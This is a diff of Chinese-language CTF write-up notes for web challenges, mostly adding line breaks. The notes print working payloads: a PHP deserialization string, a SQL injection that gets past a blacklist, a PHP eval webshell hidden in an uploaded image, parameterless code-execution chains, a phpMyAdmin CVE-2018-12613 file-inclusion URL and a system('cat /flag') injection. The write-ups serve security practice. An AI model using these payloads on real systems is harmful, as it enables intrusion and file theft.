+<p>因为是 protect 的，所以有 00 字符，但是这样会有过滤，然而是弱类型所以直接数字绕过<br />
 php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</p>
 <p><img alt="image.png" src="../img/551828_zv1qyrrwm6gucsq0/1600655314784-c426e0d1-14d1-4f1f-983c-8086501d2c88-839256.png" /></p>
 <pre><code class="language-php">&lt;?php
@@ -8621,7 +8621,7 @@ echo $b;
 </code></pre>
 <p>O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}</p>
 <h2 id="roarctf-2019easy-java">[RoarCTF 2019]Easy Java</h2>
-<p>java...在下面有个 help 访问说没那个东西，但是改成 post 传参可以下载下来，找一下配置信息
+<p>java...在下面有个 help 访问说没那个东西，但是改成 post 传参可以下载下来，找一下配置信息<br />
 /WEB-INF/web.xml</p>
 <p><img alt="image.png" src="../img/551828_zv1qyrrwm6gucsq0/1600669431397-cb054631-6a4b-481b-a6ac-cecfd2f2406a-569070.png" /></p>
 <p>然后在 filename=/WEB-INF/classes/com/wm/ctf/FlagController.class，解码得到</p>
@@ -8629,40 +8629,40 @@ echo $b;
 <h2 id="gyctf2020blacklist">[GYCTF2020]Blacklist</h2>
 <p>输入一些 sql 语句（select），返回了 preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|./i",$inject);</p>
 <p><img alt="image.png" src="../img/551828_zv1qyrrwm6gucsq0/1601255310869-90ad4fb2-d8e7-4668-964c-5f7f6ed89d50-605732.png" /></p>
-<p>学到一种新姿势
+<p>学到一种新姿势<br />
 <code>1';handler FlagHere open; handler FlagHere read first;--+</code></p>
 <p><img alt="image.png" src="../img/551828_zv1qyrrwm6gucsq0/1601257660612-6eb32195-a92c-4fa2-86ba-9101c0997031-693217.png" /></p>
 <h2 id="mrctf2020">[MRCTF2020]你传你🐎呢</h2>
-<p>上传个 .htaccess（burp 抓包改 Content-Type: image/jpeg）
-然后上传一个图片马就可以解析了
+<p>上传个 .htaccess（burp 抓包改 Content-Type: image/jpeg）<br />
+然后上传一个图片马就可以解析了<br />
 flag 在根目录</p>
 <h2 id="mrctf2020ez_bypass">[MRCTF2020]Ez_bypass</h2>
-<p><a href="https://www.yuque.com/hxfqg9/web/oxci5k#naqjq">https://www.yuque.com/hxfqg9/web/oxci5k#naqjq</a>
+<p><a href="https://www.yuque.com/hxfqg9/web/oxci5k#naqjq">https://www.yuque.com/hxfqg9/web/oxci5k#naqjq</a><br />
 <img alt="image.png" src="../img/551828_zv1qyrrwm6gucsq0/1601259164530-70f05507-258c-4f3a-90dd-8c537c37fcac-998357.png" /></p>
 <h2 id="gxyctf2019">[GXYCTF2019]禁止套娃</h2>
 <p>.git 403，githack 可以得到 index.php，然后是无参数命令执行</p>
 <blockquote>
-<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组
-scandir() 列出 images 目录中的文件和目录
-readfile() 输出一个文件
-current() 返回数组中的当前单元, 默认取第一个值
-pos() 与 current() 一样，current() 的别名
-next() 函数将内部指针指向数组中的下一个元素，并输出
-array_reverse()以相反的元素顺序返回数组
-highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码
+<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组<br />
+scandir() 列出 images 目录中的文件和目录<br />
+readfile() 输出一个文件<br />
+current() 返回数组中的当前单元, 默认取第一个值<br />
+pos() 与 current() 一样，current() 的别名<br />
+next() 函数将内部指针指向数组中的下一个元素，并输出<br />
+array_reverse()以相反的元素顺序返回数组<br />
+highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码<br />
 show_source() 显示文件内容</p>
 </blockquote>
-<p>所以：?exp=print_r(scandir(pos(localeconv()))); 就可以输出目录下的文件
+<p>所以：?exp=print_r(scandir(pos(localeconv()))); 就可以输出目录下的文件<br />
 读 flag.php ?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p>
 <h2 id="2019easy_web">[安洵杯 2019]easy_web</h2>
-<p>刚打开的时候有个 img 的参数，是 555.png 经过 hex 和两次 base64 编码之后的，会以 base64 的形式展示在图片上，可以对 index.php 进行 hex 与两次 base64 然后传进去拿到 index.php 的源码
-有个 md5 碰撞的
+<p>刚打开的时候有个 img 的参数，是 555.png 经过 hex 和两次 base64 编码之后的，会以 base64 的形式展示在图片上，可以对 index.php 进行 hex 与两次 base64 然后传进去拿到 index.php 的源码<br />
+有个 md5 碰撞的<br />
 命令执行有个黑名单，但是 sort 命令没有过滤掉，可以 sort /flag 出 flag</p>
 <h2 id="gxyctf2019babyupload">[GXYCTF2019]BabyUpload</h2>
-<p>上传 .htaccess 的时候改一下文件类型 <strong>image/jpeg</strong>
+<p>上传 .htaccess 的时候改一下文件类型 <strong>image/jpeg</strong><br />
 然后传一个图片马（过滤了 php 应该，改成 <script language="php">eval ($_POST['yichen']);</script>）</p>
 <h2 id="bjdctf2020mark-loves-cat">[BJDCTF2020]Mark loves cat</h2>
-<p>git 源码泄露，可以拿到源码
+<p>git 源码泄露，可以拿到源码<br />
 首先 post 传参 $flag=flag，</p>
 <pre><code class="language-php">&lt;?php
 foreach($_POST as $x =&gt; $y){
@@ -8683,10 +8683,10 @@ if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag'])){
 </code></pre>
 <p>只要不传入 flag 参数就会把 $yds 给打印出来，此时 $yds 已经等于 $flag 了，所以会把 flag 给打印出来</p>
 <h2 id="gwctf-2019">[GWCTF 2019]我有一个数据库</h2>
-<p><strong>phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞</strong>
+<p><strong>phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞</strong><br />
 <a href="http://4208ab9f-7d19-4f71-a05d-5ad5c79f5850.node3.buuoj.cn/phpmyadmin?target=db_datadict.php%25253f/../../../../../../../../flag">http://4208ab9f-7d19-4f71-a05d-5ad5c79f5850.node3.buuoj.cn/phpmyadmin?target=db_datadict.php%253f/../../../../../../../../flag</a></p>
 <h2 id="bjdctf2020zjctf">[BJDCTF2020]ZJCTF，不过如此</h2>
-<p>一开始伪协议读出 next.php 源码，然后 <a href="https://www.yuque.com/hxfqg9/web/igzkae#xw9Pe">preg_replace /e</a> 命令执行
+<p>一开始伪协议读出 next.php 源码，然后 <a href="https://www.yuque.com/hxfqg9/web/igzkae#xw9Pe">preg_replace /e</a> 命令执行<br />
 next.php?\S*={${getFlag()}}&amp;cmd=system('cat /flag');</p>
 <h2 id="bjdctf2020the-mystery-of-ip">[BJDCTF2020]The mystery of ip</h2>
 <p>XFF 存在模版注入</p>
